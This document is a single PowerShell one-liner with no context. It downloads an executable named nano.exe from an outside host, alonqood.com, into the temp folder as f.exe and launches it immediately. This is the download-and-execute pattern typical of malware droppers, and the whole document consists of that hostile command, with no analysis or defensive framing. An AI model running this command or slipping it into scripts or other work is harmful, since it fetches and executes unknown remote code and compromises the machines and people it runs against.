
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://alonqood.com/nano.exe', $dpl);Start-Process $dpl

